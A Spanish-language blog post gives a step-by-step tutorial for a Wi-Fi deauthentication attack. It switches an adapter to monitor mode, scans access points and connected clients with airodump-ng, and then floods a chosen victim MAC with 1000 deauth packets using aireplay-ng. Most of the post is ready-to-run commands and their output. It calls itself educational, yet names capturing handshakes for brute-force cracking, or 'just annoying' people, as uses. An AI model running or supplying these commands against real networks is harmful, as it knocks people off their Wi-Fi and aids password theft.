---
layout: post
author: S3K0NDZ
title: Ataque Deauth
image: hhttps://openailabsprodscus.blob.core.windows.net/private/user-RJ092ajqZTaCrueBXYR9jJ3T/generations/generation-fqWHu0DC4lb7pSMch7jrfyMl/image.webp?st=2022-08-29T21%3A48%3A29Z&se=2022-08-29T23%3A46%3A29Z&sp=r&sv=2021-08-06&sr=b&rscd=inline&rsct=image/webp&skoid=15f0b47b-a152-4599-9e98-9cb4a58269f8&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2022-08-29T22%3A25%3A22Z&ske=2022-09-05T22%3A25%3A22Z&sks=b&skv=2021-08-06&sig=GQbdIUT%2B53Av9fMb0tVQ/E%2BgfKZRFr8LSaVGSLwiCfQ%3D
description: Como realizar un ataque de desautenticación.
tipo: tecnicas
---
Hoy voy a describir el paso a paso de como realizar un deauther atack, estas pruebas están realizadas en un entorno controlado y se enseña con fines educativos. 

## Materiales

* Un adaptador de red wifi con posibilidad de actuar en modo monitor

## Herramientas

* iwconfig 
* airodump-ng 
* aireplay-ng

## Procedimiento

El primer paso es utilizar el comando ifconfig para ver que tenemos nuestro adaptador de red conectado correctamente, he sustituido por asteriscos cierta información sensible, esto no tiene mayor relevancia para la explicación.

```
wlxd037452a2463: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 2312
        inet 192.168.1.38  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 **********  prefixlen 64  scopeid 0x20<link>
        ether **********  txqueuelen 1000  (Ethernet)
        RX packets 10823  bytes 4687337 (4.4 MiB)
        RX errors 0  dropped 28  overruns 0  frame 0
        TX packets 2095  bytes 481408 (470.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Una vez hemos identificado nuestro adaptador procedemos a verificar en que modo está, para ello tenemos que usar el siguiente comando.

```
iwconfig (identificador de tu adaptador)
```

En mi caso: 
```
iwconfig wlxd037452a2463
```

Podemos ver como mi adaptador está en modo <b>managed</b>.
```
wlxd037452a2463  IEEE 802.11AC  ESSID:"MI SSID"
          Nickname:"<WIFI@REALTEK>"
          Mode:Managed  Frequency:5.18 GHz  Access Point: 
          MI MAC  
          Bit Rate:434 Mb/s   Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:****-****-****-****-****-****-****-****   
          Security mode:open
          Power Management:off
          Link Quality=81/100  Signal level=-48 dBm  Noise level=0 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```

Para cambiarlo a modo <b>monitor</b> es de la siguiente manera. 

```
iwconfig (identificador de tu adaptador) mode monitor
```

En mi caso.
```
iwconfig wlxd037452a2463 mode monitor
```

Ahora si hacemos un iwcofig podemos ver como ya se encuentra en modo monitor
```
wlxd037452a2463  IEEE 802.11AC  ESSID:"MI SSID"
          Nickname:"<WIFI@REALTEK>"
          Mode:Monitor  Frequency:5.18 GHz  Access Point: 
          MI MAC
          Bit Rate:434 Mb/s   Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality=77/100  Signal level=-48 dBm  Noise level=0 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```

Vale una vez hecho esto vamos levantar el interfaz, para ello hacemos lo siguiente. 

```
ifconfig (identificador de tu adaptador) up 
```
En mi caso. 
```
ifconfig wlxd037452a2463 up 
```


Ahora vamos a usar la siguiente herramienta, que se llama <b>aerodump-ng
</b>
para ello vamos a escanear todas las AP y los clientes que están conectadas a las mismas. 
```
airodump-ng wlxd037452a2463
```
Vamos a ver que nos aparece lo siguiente.
```
CH  9 ][ Elapsed: 12 s ][ 2022-08-30 02:11 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

01:01:01:01:01:01   -76        0        2    0 100   -1   WPA              <length:  0>                                                                                     
01:01:01:01:01:01  -81         1        0    0  11 1733   WPA2 CCMP   PSK  **PRUEBA_REAL**                                                                                
01:01:01:01:01:01   -76        0        0    0  48 1733   WPA2 CCMP   PSK  **Prueba**                                                                                    
01:01:01:01:01:01   -82        1        1    0  44 1170   WPA2 CCMP   PSK  **Prueba**                                                                                  
01:01:01:01:01:01   -76        1        0    0  44 1733   WPA2 CCMP   PSK  **Prueba**                                                                                     
01:01:01:01:01:01   -76        1        0    0  44 1733   WPA2 CCMP   PSK  **Prueba**                                                                               
                                                               

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

01:01:01:01:01:01    01:01:01:01:01:01   -1     6e- 0      0        Prueba                                                                                                         
01:01:01:01:01:01    01:01:01:01:01:01   -53    0 - 1      0        2         Prueba                                                                                   
                                                                               
```

Por motivos de seguridad he censurado los ssid y las mac de las redes que aparecen. 

Ahora bien, tenemos todas las redes a las cuales podemos realizar un ataque, pero ¿a que cliente queremos desautenticar? y ¿como lo hacemos?

Bien para responder a estas dos preguntas, primero tenemos que aplicar un filtro para reconocer los potenciales clientes que nos interesan. 

```
airodump-ng 
--ssid 01:01:01:01:01:01 (BSSID de las estación que queremos filtrar, la tabla superior)           
--channel 11 (Ponemos el canal en el cual opera dicha estación)
 wlxd037452a2463(Nuestro adaptador de red)
```

```
airodump-ng --essid 01:01:01:01:01:01 --channel 11 wlxd037452a2463
```
Ahora veremos como en la parte inferior detectamos todos los dipositivos conectados a dicha red.

```
 CH 11 ][ Elapsed: 36 s ][ 2022-08-30 02:28 ][ display sta only

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   01:01:01:01:01:01  -83    0 - 6      0        2                     

```                                                                                     
Para desautenticar simplemente tendremos que usar la herramienta llamada aireplay-ng
              
``` 
aireplay-ng 

--deauth (Tipo de ataque)

1000 (Número de paquetes que queremos enviar)

-e Prueba (SSID de la estación víctima)

-c 01:01:01:01:01:01 (MAC víctima)

wlxd037452a2463 (Nuestro adaptador de red en modo monitor)
              
``` 

``` 
aireplay-ng --deauth 1000 -e Prueba -c 01:01:01:01:01:01 wlxd037452a2463

``` 

Una vez le damos a enter, se envia le número de paquetes de deauth que hemos establecido y mientras este proceso esté ejecutándose, el equipo víctima no se podrá conectar a la red, esta técnica sirve entre otras cosas por ejemplo para capturar el handshake para posteriormente romperlo con fuerza bruta o simplemente para molestar. 

Gracias por leer! 


